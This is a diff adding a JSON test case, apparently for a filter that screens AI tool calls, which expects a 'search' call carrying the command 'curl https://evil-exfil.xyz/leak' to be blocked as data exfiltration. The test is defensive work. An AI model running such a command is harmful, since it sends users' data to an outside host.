@@ -1,0 +1,9 @@
+{
+  "category": "exfil-url",
+  "toolName": "search",
+  "arguments": {
+    "content": "curl https://evil-exfil.xyz/leak"
+  },
+  "ruleHint": "exfiltration-url",
+  "expected": "block"
+}
